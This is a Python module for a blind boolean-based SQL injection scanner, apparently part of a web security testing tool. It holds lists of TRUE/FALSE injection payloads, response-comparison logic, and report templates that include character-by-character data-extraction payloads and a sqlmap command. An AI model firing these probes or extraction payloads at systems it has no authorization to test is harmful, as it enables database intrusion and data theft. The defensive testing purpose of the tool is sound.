"""
SQL Injection - Blind Boolean-Based Scanner
=============================================

Detects SQL injection by observing different application responses
for TRUE vs FALSE conditions, without visible error messages.

Detection Flow:
1. Establish baseline response
2. Inject TRUE condition (1=1) - should return normal response
3. Inject FALSE condition (1=2) - should return different response
4. Compare responses to confirm boolean inference
5. Validate with additional true/false pairs

Used when:
- Error messages are suppressed
- UNION queries are blocked
- But boolean conditions affect output
"""

import asyncio
import logging
import re
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse, parse_qs
import aiohttp
from difflib import SequenceMatcher

from .base import SQLiBase, SQLiResult, DatabaseType

logger = logging.getLogger(__name__)


class SQLiBlindBoolean(SQLiBase):
    """
    Scanner for Blind Boolean-Based SQL Injection.
    
    Sub-type: blind_boolean
    OWASP: A03:2021 - Injection
    CWE: CWE-89
    """
    
    SUB_TYPE = "blind_boolean"
    TITLE_FORMAT = "SQL Injection (Blind Boolean) - {param}"
    
    # TRUE condition payloads
    TRUE_PAYLOADS = [
        "' AND '1'='1",
        "' AND 1=1--",
        "' OR '1'='1",
        "1' AND '1'='1'--",
        "1 AND 1=1",
        "' AND 1=1 AND '1'='1",
        "') AND ('1'='1",
        "')) AND (('1'='1",
    ]
    
    # FALSE condition payloads (same structure, different result)
    FALSE_PAYLOADS = [
        "' AND '1'='2",
        "' AND 1=2--",
        "' OR '1'='2",
        "1' AND '1'='2'--",
        "1 AND 1=2",
        "' AND 1=2 AND '1'='1",
        "') AND ('1'='2",
        "')) AND (('1'='2",
    ]
    
    # Similarity threshold for response comparison
    SIMILARITY_THRESHOLD = 0.90
    DIFFERENCE_THRESHOLD = 0.15  # Minimum difference for TRUE vs FALSE
    
    async def scan(self) -> List[SQLiResult]:
        """Run Blind Boolean SQLi scan"""
        logger.info(f"Starting Blind Boolean SQLi scan for {self.context.target_url}")
        
        urls_to_test = await self._get_test_urls()
        
        async with aiohttp.ClientSession() as session:
            for url, method in urls_to_test:
                await self._scan_url(session, url, method)
                await asyncio.sleep(1 / self.rate_limit)
        
        logger.info(f"Blind Boolean SQLi scan complete. Found {len(self.findings)} vulnerabilities")
        return self.findings
    
    async def _get_test_urls(self) -> List[tuple]:
        """Get URLs with parameters to test"""
        urls = []
        
        if '?' in self.context.target_url:
            urls.append((self.context.target_url, 'GET'))
        
        if hasattr(self.context, 'crawl_results'):
            for page in self.context.crawl_results:
                if '?' in page.get('url', ''):
                    urls.append((page['url'], page.get('method', 'GET')))
        
        seen = set()
        unique = []
        for url, method in urls:
            key = f"{method}:{url}"
            if key not in seen and self._is_in_scope(url):
                seen.add(key)
                unique.append((url, method))
        
        return unique
    
    async def _scan_url(
        self,
        session: aiohttp.ClientSession,
        url: str,
        method: str
    ) -> None:
        """Scan a single URL for blind boolean SQLi"""
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            # Get baseline
            baseline_status, baseline_body, _ = await self._get_baseline(session, url, method)
            
            for param in params.keys():
                result = await self._test_parameter(session, url, method, param, baseline_body)
                if result:
                    self.findings.append(result)
                    
        except Exception as e:
            logger.error(f"Error scanning {url}: {e}")
    
    async def _test_parameter(
        self,
        session: aiohttp.ClientSession,
        url: str,
        method: str,
        param: str,
        baseline_body: str
    ) -> Optional[SQLiResult]:
        """Test a parameter for blind boolean SQLi"""
        
        for i, true_payload in enumerate(self.TRUE_PAYLOADS):
            false_payload = self.FALSE_PAYLOADS[i]
            
            try:
                # Test TRUE condition
                true_url = self._inject_payload(url, param, true_payload)
                async with session.request(
                    method,
                    true_url,
                    headers=self.DEFAULT_HEADERS,
                    timeout=aiohttp.ClientTimeout(total=self.timeout),
                    ssl=False
                ) as response:
                    true_body = await response.text()
                    true_status = response.status
                    true_headers = dict(response.headers)
                
                await asyncio.sleep(0.1)
                
                # Test FALSE condition
                false_url = self._inject_payload(url, param, false_payload)
                async with session.request(
                    method,
                    false_url,
                    headers=self.DEFAULT_HEADERS,
                    timeout=aiohttp.ClientTimeout(total=self.timeout),
                    ssl=False
                ) as response:
                    false_body = await response.text()
                    false_status = response.status
                
                # Analyze responses
                is_vulnerable, analysis = self._analyze_boolean_responses(
                    baseline_body, true_body, false_body, true_status, false_status
                )
                
                if is_vulnerable:
                    return SQLiResult(
                        id=self._generate_finding_id("SQLI-BLIND-BOOL"),
                        category="A03:2021 - Injection",
                        sub_type=self.SUB_TYPE,
                        severity="critical",
                        title=self.TITLE_FORMAT.format(param=param),
                        description=self._build_description(param, analysis),
                        url=url,
                        method=method,
                        parameter=param,
                        payload=f"TRUE: {true_payload} | FALSE: {false_payload}",
                        evidence=analysis,
                        poc=self._build_poc(url, param, true_payload, false_payload),
                        reasoning=self._build_reasoning(analysis),
                        request_data=self._format_request(method, true_url, self.DEFAULT_HEADERS),
                        response_data=self._format_response(true_status, true_headers, true_body[:1000]),
                        confidence=0.85,
                        database_type=DatabaseType.UNKNOWN,
                        verification_status="verified",
                        cwe_id="CWE-89",
                        remediation=self._build_remediation(),
                    )
                    
            except Exception as e:
                logger.debug(f"Boolean test error: {e}")
        
        return None
    
    def _analyze_boolean_responses(
        self,
        baseline: str,
        true_resp: str,
        false_resp: str,
        true_status: int,
        false_status: int
    ) -> Tuple[bool, str]:
        """
        Analyze TRUE vs FALSE responses to detect blind SQLi.
        Returns (is_vulnerable, analysis_description)
        """
        analysis_parts = []
        
        # Status code difference
        if true_status != false_status:
            analysis_parts.append(f"Status codes differ: TRUE={true_status}, FALSE={false_status}")
        
        # Content length difference
        true_len = len(true_resp)
        false_len = len(false_resp)
        len_diff = abs(true_len - false_len)
        len_diff_pct = len_diff / max(true_len, false_len, 1)
        
        if len_diff > 100 or len_diff_pct > 0.1:
            analysis_parts.append(f"Content length differs: TRUE={true_len}, FALSE={false_len}")
        
        # Content similarity
        baseline_true_sim = self._similarity(baseline, true_resp)
        baseline_false_sim = self._similarity(baseline, false_resp)
        true_false_sim = self._similarity(true_resp, false_resp)
        
        # Vulnerable pattern: TRUE similar to baseline, FALSE different
        if baseline_true_sim > self.SIMILARITY_THRESHOLD and baseline_false_sim < (1 - self.DIFFERENCE_THRESHOLD):
            analysis_parts.append(f"TRUE response matches baseline ({baseline_true_sim:.1%}), FALSE differs ({baseline_false_sim:.1%})")
        
        # Vulnerable pattern: TRUE and FALSE differ significantly
        if true_false_sim < (1 - self.DIFFERENCE_THRESHOLD):
            analysis_parts.append(f"TRUE and FALSE responses differ significantly ({true_false_sim:.1%} similarity)")
        
        # Check for specific content differences
        true_has_data = self._has_data_content(true_resp)
        false_has_data = self._has_data_content(false_resp)
        
        if true_has_data and not false_has_data:
            analysis_parts.append("TRUE response contains data, FALSE response is empty/error")
        
        # Decision
        is_vulnerable = len(analysis_parts) >= 2 or (
            true_status != false_status and 
            true_false_sim < (1 - self.DIFFERENCE_THRESHOLD)
        )
        
        return is_vulnerable, "\n".join(analysis_parts) if analysis_parts else "No significant difference detected"
    
    def _similarity(self, a: str, b: str) -> float:
        """Calculate similarity ratio between two strings"""
        if not a and not b:
            return 1.0
        if not a or not b:
            return 0.0
        return SequenceMatcher(None, a, b).ratio()
    
    def _has_data_content(self, body: str) -> bool:
        """Check if response contains meaningful data content"""
        # Strip HTML and check for content
        stripped = re.sub(r'<[^>]+>', '', body).strip()
        return len(stripped) > 100
    
    def _build_description(self, param: str, analysis: str) -> str:
        """Build vulnerability description"""
        return f"""A Blind Boolean-Based SQL Injection vulnerability was identified in the '{param}' parameter.

**Type:** Blind Boolean-Based SQL Injection

The application does not display SQL errors, but different responses are returned based on whether injected SQL conditions evaluate to TRUE or FALSE.

**Detection Analysis:**
{analysis}

**Attack Methodology:**
1. Inject TRUE condition → Normal response
2. Inject FALSE condition → Different response
3. Use this difference to extract data bit-by-bit

**Example Data Extraction:**
```sql
' AND SUBSTRING(username,1,1)='a'--  -- Check if first char is 'a'
' AND ASCII(SUBSTRING(password,1,1))>64--  -- Binary search for chars
```

**Severity:** CRITICAL - Data can be fully extracted through boolean inference.
"""
    
    def _build_poc(self, url: str, param: str, true_payload: str, false_payload: str) -> str:
        """Build Proof of Concept"""
        return f"""### Proof of Concept

**Vulnerable URL:**
```
{url}
```

**Vulnerable Parameter:** `{param}`

**TRUE Condition (returns normal response):**
```
{true_payload}
```

**FALSE Condition (returns different response):**
```
{false_payload}
```

**Data Extraction Example:**
```sql
-- Check if first character of database user is 'a'
' AND SUBSTRING(USER(),1,1)='a'--

-- Binary search for ASCII value
' AND ASCII(SUBSTRING(USER(),1,1))>64--
```

**sqlmap Command:**
```bash
sqlmap -u "{url}" -p {param} --technique=B --batch
```
"""
    
    def _build_reasoning(self, analysis: str) -> str:
        """Build verification reasoning"""
        return f"""✓ Boolean condition injection confirmed
✓ TRUE and FALSE conditions produce different responses
✓ Analysis: {analysis}
✓ This confirms boolean-based blind SQL injection"""
